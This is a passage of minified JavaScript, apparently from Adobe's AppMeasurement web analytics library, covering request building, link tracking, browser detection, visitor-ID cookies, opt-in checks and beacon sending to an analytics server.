                ".as"] = g.authState))); h && (c += a.q("cid", h))
            } a.AudienceManagement && a.AudienceManagement.isReady() && (c += a.q("d", a.AudienceManagement.getEventCallConfigParams())); for (d = 0; d < K.length; d++) {
              h = K[d]; m = a[h]; g = h.substring(0, 4); var I = h.substring(4); m || ("events" == h && B ? (m = B, B = "") : "marketingCloudOrgID" == h && F && a.K("ECID") && (m = F.marketingCloudOrgID)); if (m && (!v || 0 <= v.indexOf("," + h + ","))) {
                switch (h) {
                  case "customerPerspective": h = "cp"; break; case "marketingCloudOrgID": h = "mcorgid"; break; case "supplementalDataID": h = "sdid";
                    break; case "timestamp": h = "ts"; break; case "dynamicVariablePrefix": h = "D"; break; case "visitorID": h = "vid"; break; case "marketingCloudVisitorID": h = "mid"; break; case "analyticsVisitorID": h = "aid"; break; case "audienceManagerLocationHint": h = "aamlh"; break; case "audienceManagerBlob": h = "aamb"; break; case "authState": h = "as"; break; case "pageURL": h = "g"; 255 < m.length && (a.pageURLRest = m.substring(255), m = m.substring(0, 255)); break; case "pageURLRest": h = "-g"; break; case "referrer": h = "r"; break; case "vmk": case "visitorMigrationKey": h =
                      "vmt"; break; case "visitorMigrationServer": h = "vmf"; a.ssl && a.visitorMigrationServerSecure && (m = ""); break; case "visitorMigrationServerSecure": h = "vmf"; !a.ssl && a.visitorMigrationServer && (m = ""); break; case "charSet": h = "ce"; break; case "visitorNamespace": h = "ns"; break; case "cookieDomainPeriods": h = "cdp"; break; case "cookieLifetime": h = "cl"; break; case "variableProvider": h = "vvp"; break; case "currencyCode": h = "cc"; break; case "channel": h = "ch"; break; case "transactionID": h = "xact"; break; case "campaign": h = "v0"; break; case "latitude": h =
                        "lat"; break; case "longitude": h = "lon"; break; case "resolution": h = "s"; break; case "colorDepth": h = "c"; break; case "javascriptVersion": h = "j"; break; case "javaEnabled": h = "v"; break; case "cookiesEnabled": h = "k"; break; case "browserWidth": h = "bw"; break; case "browserHeight": h = "bh"; break; case "connectionType": h = "ct"; break; case "homepage": h = "hp"; break; case "events": B && (m += ("" != m ? "," : "") + B); if (u) for (I = m.split(","), m = "", g = 0; g < I.length; g++) {
                          var ea = I[g]; var fa = ea.indexOf("\x3d"); 0 <= fa && (ea = ea.substring(0, fa)); fa = ea.indexOf(":");
                          0 <= fa && (ea = ea.substring(0, fa)); 0 <= u.indexOf("," + ea + ",") && (m += (m ? "," : "") + I[g])
                        } break; case "events2": m = ""; break; case "contextData": c += a.q("c", a[h], v, h); m = ""; break; case "lightProfileID": h = "mtp"; break; case "lightStoreForSeconds": h = "mtss"; a.lightProfileID || (m = ""); break; case "lightIncrementBy": h = "mti"; a.lightProfileID || (m = ""); break; case "retrieveLightProfiles": h = "mtsr"; break; case "deleteLightProfiles": h = "mtsd"; break; case "retrieveLightData": a.retrieveLightProfiles && (c += a.q("mts", a[h], v, h)); m = ""; break; default: a.Pa(I) &&
                          ("prop" == g ? h = "c" + I : "eVar" == g ? h = "v" + I : "list" == g ? h = "l" + I : "hier" == g && (h = "h" + I, m = m.substring(0, 255)))
                }m && (c += "\x26" + h + "\x3d" + ("pev" != h.substring(0, 3) ? a.escape(m) : m))
              } "pev3" == h && a.e && (c += a.e)
            } a.ja && (c += "\x26lrt\x3d" + a.ja, a.ja = null); return c
          }; a.C = function (c) {
            var d = c.tagName; if ("undefined" != "" + c.ec || "undefined" != "" + c.Ub && "HTML" != ("" + c.Ub).toUpperCase()) return ""; d = d && d.toUpperCase ? d.toUpperCase() : ""; "SHAPE" == d && (d = ""); d && (("INPUT" == d || "BUTTON" == d) && c.type && c.type.toUpperCase ? d = c.type.toUpperCase() : !d && c.href &&
              (d = "A")); return d
          }; a.La = function (c) { var d = y.location, g = c.href ? c.href : ""; var h = g.indexOf(":"); var m = g.indexOf("?"); var v = g.indexOf("/"); g && (0 > h || 0 <= m && h > m || 0 <= v && h > v) && (m = c.protocol && 1 < c.protocol.length ? c.protocol : d.protocol ? d.protocol : "", h = d.pathname.lastIndexOf("/"), g = (m ? m + "//" : "") + (c.host ? c.host : d.host ? d.host : "") + ("/" != g.substring(0, 1) ? d.pathname.substring(0, 0 > h ? 0 : h) + "/" : "") + g); return g }; a.N = function (c) {
            var d = a.C(c), g, h, m = "", v = 0; return d && (g = c.protocol, h = c.onclick, !c.href || "A" != d && "AREA" != d || h &&
              g && !(0 > g.toLowerCase().indexOf("javascript")) ? h ? (m = a.replace(a.replace(a.replace(a.replace("" + h, "\r", ""), "\n", ""), "\t", ""), " ", ""), v = 2) : "INPUT" == d || "SUBMIT" == d ? (c.value ? m = c.value : c.innerText ? m = c.innerText : c.textContent && (m = c.textContent), v = 3) : "IMAGE" == d && c.src && (m = c.src) : m = a.La(c), m) ? { id: m.substring(0, 100), type: v } : 0
          }; a.bc = function (c) {
            for (var d = a.C(c), g = a.N(c); c && !g && "BODY" != d;)if (c = c.parentElement ? c.parentElement : c.parentNode) d = a.C(c), g = a.N(c); g && "BODY" != d || (c = 0); c && (d = c.onclick ? "" + c.onclick : "", 0 <=
              d.indexOf(".tl(") || 0 <= d.indexOf(".trackLink(")) && (c = 0); return c
          }; a.Tb = function () {
            var c, d = a.linkObject, g = a.linkType, h = a.linkURL, m; a.la = 1; d || (a.la = 0, d = a.clickObject); if (d) { var v = a.C(d); for (c = a.N(d); d && !c && "BODY" != v;)if (d = d.parentElement ? d.parentElement : d.parentNode) v = a.C(d), c = a.N(d); c && "BODY" != v || (d = 0); if (d && !a.linkObject) { var u = d.onclick ? "" + d.onclick : ""; if (0 <= u.indexOf(".tl(") || 0 <= u.indexOf(".trackLink(")) d = 0 } } else a.la = 1; !h && d && (h = a.La(d)); h && !a.linkLeaveQueryString && (m = h.indexOf("?"), 0 <= m && (h = h.substring(0,
              m))); if (!g && h) {
                var B = 0, F = 0, K; if (a.trackDownloadLinks && a.linkDownloadFileTypes) { u = h.toLowerCase(); m = u.indexOf("?"); var I = u.indexOf("#"); 0 <= m ? 0 <= I && I < m && (m = I) : m = I; 0 <= m && (u = u.substring(0, m)); m = a.linkDownloadFileTypes.toLowerCase().split(","); for (I = 0; I < m.length; I++)(K = m[I]) && u.substring(u.length - (K.length + 1)) == "." + K && (g = "d") } if (a.trackExternalLinks && !g && (u = h.toLowerCase(), a.Oa(u) && (a.linkInternalFilters || (a.linkInternalFilters = y.location.hostname), m = 0, a.linkExternalFilters ? (m = a.linkExternalFilters.toLowerCase().split(","),
                  B = 1) : a.linkInternalFilters && (m = a.linkInternalFilters.toLowerCase().split(",")), m))) { for (I = 0; I < m.length; I++)K = m[I], 0 <= u.indexOf(K) && (F = 1); F ? B && (g = "e") : B || (g = "e") }
              } a.linkObject = d; a.linkURL = h; a.linkType = g; if (a.trackClickMap || a.trackInlineStats) a.e = "", d && (g = a.pageName, h = 1, d = d.sourceIndex, g || (g = a.pageURL, h = 0), y.s_objectID && (c.id = y.s_objectID, d = c.type = 1), g && c && c.id && v && (a.e = "\x26pid\x3d" + a.escape(g.substring(0, 255)) + (h ? "\x26pidt\x3d" + h : "") + "\x26oid\x3d" + a.escape(c.id.substring(0, 100)) + (c.type ? "\x26oidt\x3d" +
                c.type : "") + "\x26ot\x3d" + v + (d ? "\x26oi\x3d" + d : "")))
          }; a.Mb = function () {
            var c = a.la, d = a.linkType, g = a.linkURL, h = a.linkName; d && (g || h) && (d = d.toLowerCase(), "d" != d && "e" != d && (d = "o"), a.pe = "lnk_" + d, a.pev1 = g ? a.escape(g) : "", a.pev2 = h ? a.escape(h) : "", c = 1); a.abort && (c = 0); if (a.trackClickMap || a.trackInlineStats || a.Pb()) {
              d = {}; g = 0; var m = a.ob(), v = m ? m.split("\x26") : 0, u, B; m = 0; if (v) for (u = 0; u < v.length; u++) { var F = v[u].split("\x3d"); h = a.unescape(F[0]).split(","); F = a.unescape(F[1]); d[F] = h } h = a.account.split(","); u = {}; for (B in a.contextData) B &&
                !Object.prototype[B] && "a.activitymap." == B.substring(0, 14) && (u[B] = a.contextData[B], a.contextData[B] = ""); a.e = a.q("c", u) + (a.e ? a.e : ""); if (c || a.e) {
                  c && !a.e && (m = 1); for (F in d) if (!Object.prototype[F]) for (B = 0; B < h.length; B++)for (m && (v = d[F].join(","), v == a.account && (a.e += ("\x26" != F.charAt(0) ? "\x26" : "") + F, d[F] = [], g = 1)), u = 0; u < d[F].length; u++)v = d[F][u], v == h[B] && (m && (a.e += "\x26u\x3d" + a.escape(v) + ("\x26" != F.charAt(0) ? "\x26" : "") + F + "\x26u\x3d0"), d[F].splice(u, 1), g = 1); c || (g = 1); if (g) {
                    m = ""; u = 2; !c && a.e && (m = a.escape(h.join(",")) +
                      "\x3d" + a.escape(a.e), u = 1); for (F in d) !Object.prototype[F] && 0 < u && 0 < d[F].length && (m += (m ? "\x26" : "") + a.escape(d[F].join(",")) + "\x3d" + a.escape(F), u--); a.ub(m)
                  }
                }
            } return c
          }; a.ob = function () { if (a.useLinkTrackSessionStorage) { if (a.Ca()) return y.sessionStorage.getItem(a.R) } else return a.cookieRead(a.R) }; a.Ca = function () { return y.sessionStorage ? !0 : !1 }; a.ub = function (c) { a.useLinkTrackSessionStorage ? a.Ca() && y.sessionStorage.setItem(a.R, c) : a.cookieWrite(a.R, c) }; a.Nb = function () {
            if (!a.Xb) {
              var c = new Date, d = R.location,
              g = "1.2", h = a.cookieWrite("s_cc", "true", 0) ? "Y" : "N", m = "", v = ""; if (c.setUTCDate && (g = "1.3", (0).toPrecision && (g = "1.5", c = [], c.forEach))) { g = "1.6"; var u = 0; var B = {}; try { u = new Iterator(B), u.next && (g = "1.7", c.reduce && (g = "1.8", g.trim && (g = "1.8.1", Date.parse && (g = "1.8.2", Object.create && (g = "1.8.5"))))) } catch (I) { } } B = screen.width + "x" + screen.height; c = navigator.javaEnabled() ? "Y" : "N"; u = screen.pixelDepth ? screen.pixelDepth : screen.colorDepth; var F = a.w.innerWidth ? a.w.innerWidth : a.d.documentElement.offsetWidth; var K = a.w.innerHeight ?
                a.w.innerHeight : a.d.documentElement.offsetHeight; try { a.b.addBehavior("#default#homePage"), m = a.b.cc(d) ? "Y" : "N" } catch (I) { } try { a.b.addBehavior("#default#clientCaps"), v = a.b.connectionType } catch (I) { } a.resolution = B; a.colorDepth = u; a.javascriptVersion = g; a.javaEnabled = c; a.cookiesEnabled = h; a.browserWidth = F; a.browserHeight = K; a.connectionType = v; a.homepage = m; a.Xb = 1
            }
          }; a.S = {}; a.loadModule = function (c, d) {
            var g = a.S[c]; if (!g) {
              g = y["AppMeasurement_Module_" + c] ? new y["AppMeasurement_Module_" + c](a) : {}; a.S[c] = a[c] = g; g.jb =
                function () { return g.rb }; g.vb = function (h) { if (g.rb = h) a[c + "_onLoad"] = h, a.fa(c + "_onLoad", [a, g], 1) || h(a, g) }; try { Object.defineProperty ? Object.defineProperty(g, "onLoad", { get: g.jb, set: g.vb }) : g._olc = 1 } catch (h) { g._olc = 1 }
            } d && (a[c + "_onLoad"] = d, a.fa(c + "_onLoad", [a, g], 1) || d(a, g))
          }; a.o = function (c) { var d, g; for (d in a.S) if (!Object.prototype[d] && (g = a.S[d]) && (g._olc && g.onLoad && (g._olc = 0, g.onLoad(a, g)), g[c] && g[c]())) return 1; return 0 }; a.Pb = function () { return a.ActivityMap && a.ActivityMap._c ? !0 : !1 }; a.Qb = function () {
            var c =
              Math.floor(1E13 * Math.random()), d = a.visitorSampling, g = a.visitorSamplingGroup; g = "s_vsn_" + (a.visitorNamespace ? a.visitorNamespace : a.account) + (g ? "_" + g : ""); var h = a.cookieRead(g); if (d) { d *= 100; h && (h = parseInt(h)); if (!h) { if (!a.cookieWrite(g, c)) return 0; h = c } if (h % 1E4 > d) return 0 } return 1
          }; a.T = function (c, d) { var g, h, m, v, u; for (g = 0; 2 > g; g++) { var B = 0 < g ? a.Da : a.g; for (h = 0; h < B.length; h++)if (m = B[h], (v = c[m]) || c["!" + m]) { if (!d && ("contextData" == m || "retrieveLightData" == m) && a[m]) for (u in a[m]) v[u] || (v[u] = a[m][u]); a[m] = v } } }; a.Za =
            function (c, d) { var g, h; for (g = 0; 2 > g; g++) { var m = 0 < g ? a.Da : a.g; for (h = 0; h < m.length; h++) { var v = m[h]; c[v] = a[v]; d || c[v] || (c["!" + v] = 1) } } }; a.Hb = function (c) {
              var d, g, h, m, v, u = 0, B, F = "", K = ""; if (c && 255 < c.length && (d = "" + c, g = d.indexOf("?"), 0 < g && (B = d.substring(g + 1), d = d.substring(0, g), m = d.toLowerCase(), h = 0, "http://" == m.substring(0, 7) ? h += 7 : "https://" == m.substring(0, 8) && (h += 8), g = m.indexOf("/", h), 0 < g && (m = m.substring(h, g), v = d.substring(g), d = d.substring(0, g), 0 <= m.indexOf("google") ? u = ",q,ie,start,search_key,word,kw,cd," : 0 <=
                m.indexOf("yahoo.co") && (u = ",p,ei,"), u && B)))) { if ((c = B.split("\x26")) && 1 < c.length) { for (h = 0; h < c.length; h++)m = c[h], g = m.indexOf("\x3d"), 0 < g && 0 <= u.indexOf("," + m.substring(0, g) + ",") ? F += (F ? "\x26" : "") + m : K += (K ? "\x26" : "") + m; F && K ? B = F + "\x26" + K : K = "" } g = 253 - (B.length - K.length) - d.length; c = d + (0 < g ? v.substring(0, g) : "") + "?" + B } return c
            }; a.cb = function (c) {
              var d = a.d.visibilityState, g = ["webkitvisibilitychange", "visibilitychange"]; d || (d = a.d.webkitVisibilityState); if (d && "prerender" == d) {
                if (c) for (d = 0; d < g.length; d++)a.d.addEventListener(g[d],
                  function () { var h = a.d.visibilityState; h || (h = a.d.webkitVisibilityState); "visible" == h && c() }); return !1
              } return !0
            }; a.ba = !1; a.J = !1; a.xb = function () { a.J = !0; a.H() }; a.ca = !1; a.U = !1; a.yb = function (c) { a.marketingCloudVisitorID = c.MCMID; a.visitorOptedOut = c.MCOPTOUT; a.analyticsVisitorID = c.MCAID; a.audienceManagerLocationHint = c.MCAAMLH; a.audienceManagerBlob = c.MCAAMB; a.U = !0; a.H() }; a.bb = function (c) { a.maxDelay || (a.maxDelay = 250); return a.o("_d") ? (c && setTimeout(function () { c() }, a.maxDelay), !1) : !0 }; a.Z = !1; a.I = !1; a.za = function () {
              a.I =
              !0; a.H()
            }; a.isReadyToTrack = function () { var c = !0; if (!a.nb() || !a.mb()) return !1; a.xa() || (c = !1); a.qb() || (c = !1); return c }; a.nb = function () { a.ba || a.J || (a.cb(a.xb) ? a.J = !0 : a.ba = !0); return a.ba && !a.J ? !1 : !0 }; a.mb = function () { var c = a.va(); if (c) if (a.ta || a.aa) if (a.ta) { if (!c.isApproved(c.Categories.ANALYTICS)) return !1 } else return !1; else return c.fetchPermissions(a.sb, !0), a.aa = !0, !1; return !0 }; a.K = function (c) { var d = a.va(); return d && !d.isApproved(d.Categories[c]) ? !1 : !0 }; a.va = function () {
              return y.adobe && y.adobe.optIn ?
                y.adobe.optIn : null
            }; a.xa = function () { var c = a.V(); return c && a.K("ECID") && (a.ca || a.marketingCloudVisitorID || !c.getVisitorValues || (a.ca = !0, a.marketingCloudVisitorID ? a.U = !0 : c.getVisitorValues(a.yb)), a.ca && !a.U && !a.marketingCloudVisitorID) ? !1 : !0 }; a.V = function () { var c = a.visitor; c && !c.isAllowed() && (c = null); return c }; a.qb = function () { a.Z || a.I || (a.bb(a.za) ? a.I = !0 : a.Z = !0); return a.Z && !a.I ? !1 : !0 }; a.aa = !1; a.sb = function () { a.aa = !1; a.ta = !0 }; a.l = O; a.r = 0; a.callbackWhenReadyToTrack = function (c, d, g) {
              var h = {}; h.Cb = c; h.Bb =
                d; h.zb = g; a.l == O && (a.l = []); a.l.push(h); 0 == a.r && (a.r = setInterval(a.H, 100))
            }; a.H = function () { if (a.isReadyToTrack() && (a.wb(), a.l != O)) for (; 0 < a.l.length;) { var c = a.l.shift(); c.Bb.apply(c.Cb, c.zb) } }; a.wb = function () { a.r && (clearInterval(a.r), a.r = 0) }; a.lb = function (c) { var d, g = O; if (!a.isReadyToTrack()) { var h = []; if (c != O) for (d in g = {}, c) g[d] = c[d]; c = {}; a.Za(c, !0); h.push(g); h.push(c); a.callbackWhenReadyToTrack(a, a.track, h); return !0 } return !1 }; a.Jb = function () {
              var c = a.cookieRead("s_fid"), d = "", g = ""; var h = 8; var m = 4; if (!c ||
                0 > c.indexOf("-")) { for (c = 0; 16 > c; c++)h = Math.floor(Math.random() * h), d += "0123456789ABCDEF".substring(h, h + 1), h = Math.floor(Math.random() * m), g += "0123456789ABCDEF".substring(h, h + 1), h = m = 16; c = d + "-" + g } a.cookieWrite("s_fid", c, 1) || (c = 0); return c
            }; a.t = a.track = function (c, d) {
              var g, h = new Date, m = "s" + Math.floor(h.getTime() / 108E5) % 10 + Math.floor(1E13 * Math.random()), v = h.getYear(); v = "t\x3d" + a.escape(h.getDate() + "/" + h.getMonth() + "/" + (1900 > v ? v + 1900 : v) + " " + h.getHours() + ":" + h.getMinutes() + ":" + h.getSeconds() + " " + h.getDay() +
                " " + h.getTimezoneOffset()); var u = a.V(); a.o("_s"); a.lb(c) || (d && a.T(d), c && (g = {}, a.Za(g, 0), a.T(c)), a.Qb() && !a.visitorOptedOut && (a.wa() || (a.fid = a.Jb()), a.Tb(), a.usePlugins && a.doPlugins && a.doPlugins(a), a.account && (a.abort || (a.trackOffline && !a.timestamp && (a.timestamp = Math.floor(h.getTime() / 1E3)), h = y.location, a.pageURL || (a.pageURL = h.href ? h.href : h), a.referrer || a.$a || (h = a.Util.getQueryParam("adobe_mc_ref", null, null, !0), a.referrer = h || void 0 === h ? void 0 === h ? "" : h : R.document.referrer), a.$a = 1, a.referrer = a.Hb(a.referrer),
                  a.o("_g")), a.Mb() && !a.abort && (u && a.K("TARGET") && !a.supplementalDataID && u.getSupplementalDataID && (a.supplementalDataID = u.getSupplementalDataID("AppMeasurement:" + a._in, a.expectSupplementalData ? !1 : !0)), a.K("AAM") || (a.contextData["cm.ssf"] = 1), a.Nb(), v += a.Lb(), a.pb(m, v), a.o("_t"), a.referrer = ""))), c && a.T(g, 1)); a.abort = a.supplementalDataID = a.timestamp = a.pageURLRest = a.linkObject = a.clickObject = a.linkURL = a.linkName = a.linkType = y.s_objectID = a.pe = a.pev1 = a.pev2 = a.pev3 = a.e = a.lightProfileID = 0
            }; a.Ba = []; a.registerPreTrackCallback =
              function (c) { for (var d = [], g = 1; g < arguments.length; g++)d.push(arguments[g]); "function" == typeof c ? a.Ba.push([c, d]) : a.debugTracking && a.D("DEBUG: Non function type passed to registerPreTrackCallback") }; a.gb = function (c) { a.ua(a.Ba, c) }; a.Aa = []; a.registerPostTrackCallback = function (c) { for (var d = [], g = 1; g < arguments.length; g++)d.push(arguments[g]); "function" == typeof c ? a.Aa.push([c, d]) : a.debugTracking && a.D("DEBUG: Non function type passed to registerPostTrackCallback") }; a.fb = function (c) { a.ua(a.Aa, c) }; a.ua = function (c,
                d) { if ("object" == typeof c) for (var g = 0; g < c.length; g++) { var h = c[g][0], m = c[g][1].slice(); m.unshift(d); if ("function" == typeof h) try { h.apply(null, m) } catch (v) { a.debugTracking && a.D(v.message) } } }; a.tl = a.trackLink = function (c, d, g, h, m) { a.linkObject = c; a.linkType = d; a.linkName = g; m && (a.k = c, a.v = m); return a.track(h) }; a.trackLight = function (c, d, g, h) { a.lightProfileID = c; a.lightStoreForSeconds = d; a.lightIncrementBy = g; return a.track(h) }; a.clearVars = function () {
                  var c, d; for (c = 0; c < a.g.length; c++)if (d = a.g[c], "prop" == d.substring(0,
                    4) || "eVar" == d.substring(0, 4) || "hier" == d.substring(0, 4) || "list" == d.substring(0, 4) || "channel" == d || "events" == d || "eventList" == d || "products" == d || "productList" == d || "purchaseID" == d || "transactionID" == d || "state" == d || "zip" == d || "campaign" == d) a[d] = void 0
                }; a.tagContainerMarker = ""; a.pb = function (c, d) { c = a.hb() + "/" + c + "?AQB\x3d1\x26ndh\x3d1\x26pf\x3d1\x26" + (a.ya() ? "callback\x3ds_c_il[" + a._in + "].doPostbacks\x26et\x3d1\x26" : "") + d + "\x26AQE\x3d1"; a.gb(c); a.eb(c); a.W() }; a.hb = function () {
                  var c = a.ib(); return "http" + (a.ssl ?
                    "s" : "") + "://" + c + "/b/ss/" + a.account + "/" + (a.mobile ? "5." : "") + (a.ya() ? "10" : "1") + "/JS-" + a.version + (a.Wb ? "T" : "") + (a.tagContainerMarker ? "-" + a.tagContainerMarker : "")
                }; a.ya = function () { return a.AudienceManagement && a.AudienceManagement.isReady() || 0 != a.usePostbacks }; a.ib = function () { var c = a.dc, d = a.trackingServer; d ? a.trackingServerSecure && a.ssl && (d = a.trackingServerSecure) : (c = c ? ("" + c).toLowerCase() : "d1", "d1" == c ? c = "112" : "d2" == c && (c = "122"), d = a.kb() + "." + c + ".2o7.net"); return d }; a.kb = function () {
                  var c = a.visitorNamespace;
                  c || (c = a.account.split(",")[0], c = c.replace(/[^0-9a-z]/gi, "")); return c
                }; a.Ya = /{(%?)(.*?)(%?)}/; a.$b = RegExp(a.Ya.source, "g"); a.Gb = function (c) { if ("object" == typeof c.dests) for (var d = 0; d < c.dests.length; ++d) { var g = c.dests[d]; if ("string" == typeof g.c && "aa." == g.id.substr(0, 3)) for (var h = g.c.match(a.$b), m = 0; m < h.length; ++m) { var v = h[m], u = v.match(a.Ya), B = ""; "%" == u[1] && "timezone_offset" == u[2] ? B = (new Date).getTimezoneOffset() : "%" == u[1] && "timestampz" == u[2] && (B = a.Kb()); g.c = g.c.replace(v, a.escape(B)) } } }; a.Kb = function () {
                  var c =
                    new Date, d = new Date(6E4 * Math.abs(c.getTimezoneOffset())); return a.j(4, c.getFullYear()) + "-" + a.j(2, c.getMonth() + 1) + "-" + a.j(2, c.getDate()) + "T" + a.j(2, c.getHours()) + ":" + a.j(2, c.getMinutes()) + ":" + a.j(2, c.getSeconds()) + (0 < c.getTimezoneOffset() ? "-" : "+") + a.j(2, d.getUTCHours()) + ":" + a.j(2, d.getUTCMinutes())
                }; a.j = function (c, d) { return (Array(c + 1).join(0) + d).slice(-c) }; a.pa = {}; a.doPostbacks = function (c) {
                  if ("object" == typeof c) if (a.Gb(c), "object" == typeof a.AudienceManagement && "function" == typeof a.AudienceManagement.isReady &&
                    a.AudienceManagement.isReady() && "function" == typeof a.AudienceManagement.passData) a.AudienceManagement.passData(c); else if ("object" == typeof c && "object" == typeof c.dests) for (var d = 0; d < c.dests.length; ++d) { var g = c.dests[d]; "object" == typeof g && "string" == typeof g.c && "string" == typeof g.id && "aa." == g.id.substr(0, 3) && (a.pa[g.id] = new Image, a.pa[g.id].alt = "", a.pa[g.id].src = g.c) }
                }; a.eb = function (c) { a.i || a.Ob(); a.i.push(c); a.ia = a.B(); a.Wa() }; a.Ob = function () { a.i = a.Rb(); a.i || (a.i = []) }; a.Rb = function () {
                  var c, d; if (a.oa()) {
                    try {
                      (d =
                        y.localStorage.getItem(a.ma())) && (c = y.JSON.parse(d))
                    } catch (g) { } return c
                  }
                }; a.oa = function () { var c = !0; a.trackOffline && a.offlineFilename && y.localStorage && y.JSON || (c = !1); return c }; a.Ma = function () { var c = 0; a.i && (c = a.i.length); a.p && c++; return c }; a.W = function () { if (!a.p || (a.A && a.A.complete && a.A.F && a.A.ra(), !a.p)) if (a.Na = O, a.na) a.ia > a.P && a.Ua(a.i), a.qa(500); else { var c = a.Ab(); if (0 < c) a.qa(c); else if (c = a.Ja()) a.p = 1, a.Sb(c), a.Vb(c) } }; a.qa = function (c) { a.Na || (c || (c = 0), a.Na = setTimeout(a.W, c)) }; a.Ab = function () {
                  if (!a.trackOffline ||
                    0 >= a.offlineThrottleDelay) return 0; var c = a.B() - a.Sa; return a.offlineThrottleDelay < c ? 0 : a.offlineThrottleDelay - c
                }; a.Ja = function () { if (0 < a.i.length) return a.i.shift() }; a.Sb = function (c) { if (a.debugTracking) { var d = "AppMeasurement Debug: " + c; c = c.split("\x26"); var g; for (g = 0; g < c.length; g++)d += "\n\t" + a.unescape(c[g]); a.D(d) } }; a.wa = function () { return a.marketingCloudVisitorID || a.analyticsVisitorID }; a.Y = !1; try { var N = JSON.parse('{"x":"y"}') } catch (c) { N = null } N && "y" == N.x ? (a.Y = !0, a.X = function (c) { return JSON.parse(c) }) :
                  y.$ && y.$.parseJSON ? (a.X = function (c) { return y.$.parseJSON(c) }, a.Y = !0) : a.X = function () { return null }; a.Vb = function (c) {
                    var d, g, h; a.wa() && 2047 < c.length && (a.ab() && (g = 1, d = new XMLHttpRequest), d && (a.AudienceManagement && a.AudienceManagement.isReady() || 0 != a.usePostbacks) && (a.Y ? d.Ea = !0 : d = 0)); !d && a.Xa && (c = c.substring(0, 2047)); !d && a.d.createElement && (0 != a.usePostbacks || a.AudienceManagement && a.AudienceManagement.isReady()) && (d = a.d.createElement("SCRIPT")) && "async" in d && ((h = (h = a.d.getElementsByTagName("HEAD")) && h[0] ?
                      h[0] : a.d.body) ? (d.type = "text/javascript", d.setAttribute("async", "async"), g = 2) : d = 0); d || (d = new Image, d.alt = "", d.abort || "undefined" === typeof y.InstallTrigger || (d.abort = function () { d.src = O })); d.Ta = Date.now(); d.Ga = function () { try { d.F && (clearTimeout(d.F), d.F = 0) } catch (m) { } }; d.onload = d.ra = function () { d.Ta && (a.ja = Date.now() - d.Ta); a.fb(c); d.Ga(); a.Eb(); a.da(); a.p = 0; a.W(); if (d.Ea) { d.Ea = !1; try { a.doPostbacks(a.X(d.responseText)) } catch (m) { } } }; d.onabort = d.onerror = d.Ka = function () {
                        d.Ga(); (a.trackOffline || a.na) && a.p &&
                          a.i.unshift(a.Db); a.p = 0; a.ia > a.P && a.Ua(a.i); a.da(); a.qa(500)
                      }; d.onreadystatechange = function () { 4 == d.readyState && (200 == d.status ? d.ra() : d.Ka()) }; a.Sa = a.B(); if (1 == g) h = c.indexOf("?"), g = c.substring(0, h), h = c.substring(h + 1), h = h.replace(/&callback=[a-zA-Z0-9_.\[\]]+/, ""), d.open("POST", g, !0), d.withCredentials = !0, d.send(h); else if (d.src = c, 2 == g) { if (a.Qa) try { h.removeChild(a.Qa) } catch (m) { } h.firstChild ? h.insertBefore(d, h.firstChild) : h.appendChild(d); a.Qa = a.A } d.F = setTimeout(function () {
                        d.F && (d.complete ? d.ra() : (a.trackOffline &&
                          d.abort && d.abort(), d.Ka()))
                      }, 5E3); a.Db = c; a.A = y["s_i_" + a.replace(a.account, ",", "_")] = d; if (a.useForcedLinkTracking && a.L || a.v) a.forcedLinkTrackingTimeout || (a.forcedLinkTrackingTimeout = 250), a.ea = setTimeout(a.da, a.forcedLinkTrackingTimeout)
                  }; a.ab = function () { return "undefined" !== typeof XMLHttpRequest && "withCredentials" in new XMLHttpRequest ? !0 : !1 }; a.Eb = function () { if (a.oa() && !(a.Ra > a.P)) try { y.localStorage.removeItem(a.ma()), a.Ra = a.B() } catch (c) { } }; a.Ua = function (c) {
                    if (a.oa()) {
                      a.Wa(); try {
                        y.localStorage.setItem(a.ma(),
                          y.JSON.stringify(c)), a.P = a.B()
                      } catch (d) { }
                    }
                  }; a.Wa = function () { if (a.trackOffline) { if (!a.offlineLimit || 0 >= a.offlineLimit) a.offlineLimit = 10; for (; a.i.length > a.offlineLimit;)a.Ja() } }; a.forceOffline = function () { a.na = !0 }; a.forceOnline = function () { a.na = !1 }; a.ma = function () { return a.offlineFilename + "-" + a.visitorNamespace + a.account }; a.B = function () { return (new Date).getTime() }; a.Oa = function (c) {
                    c = c.toLowerCase(); return 0 != c.indexOf("#") && 0 != c.indexOf("about:") && 0 != c.indexOf("opera:") && 0 != c.indexOf("javascript:") ? !0 :
                      !1
                  }; a.setTagContainer = function (c) {
                    var d, g; a.Wb = c; for (d = 0; d < a._il.length; d++)if ((g = a._il[d]) && "s_l" == g._c && g.tagContainerName == c) {
                      a.T(g); if (g.lmq) for (d = 0; d < g.lmq.length; d++) { var h = g.lmq[d]; a.loadModule(h.n) } if (g.ml) for (h in g.ml) if (a[h]) for (d in c = a[h], h = g.ml[h], h) !Object.prototype[d] && ("function" != typeof h[d] || 0 > ("" + h[d]).indexOf("s_c_il")) && (c[d] = h[d]); if (g.mmq) for (d = 0; d < g.mmq.length; d++)h = g.mmq[d], a[h.m] && (c = a[h.m], c[h.f] && "function" == typeof c[h.f] && (h.a ? c[h.f].apply(c, h.a) : c[h.f].apply(c))); if (g.tq) for (d =
                        0; d < g.tq.length; d++)a.track(g.tq[d]); g.s = a; break
                    }
                  }; a.Util = {
                    urlEncode: a.escape, urlDecode: a.unescape, cookieRead: a.cookieRead, cookieWrite: a.cookieWrite, getQueryParam: function (c, d, g, h) {
                      var m = ""; d || (d = a.pageURL ? a.pageURL : y.location); g = g ? g : "\x26"; if (!c || !d) return m; d = "" + d; var v = d.indexOf("?"); if (0 > v) return m; d = g + d.substring(v + 1) + g; if (!h || !(0 <= d.indexOf(g + c + g) || 0 <= d.indexOf(g + c + "\x3d" + g))) {
                        v = d.indexOf("#"); 0 <= v && (d = d.substr(0, v) + g); v = d.indexOf(g + c + "\x3d"); if (0 > v) return m; d = d.substring(v + g.length + c.length +
                          1); v = d.indexOf(g); 0 <= v && (d = d.substring(0, v)); 0 < d.length && (m = a.unescape(d)); return m
                      }
                    }, getIeVersion: function () { if (document.documentMode) return document.documentMode; for (var c = 7; 4 < c; c--) { var d = document.createElement("div"); d.innerHTML = "\x3c!--[if IE " + c + "]\x3e\x3cspan\x3e\x3c/span\x3e\x3c![endif]--\x3e"; if (d.getElementsByTagName("span").length) return c } return null }
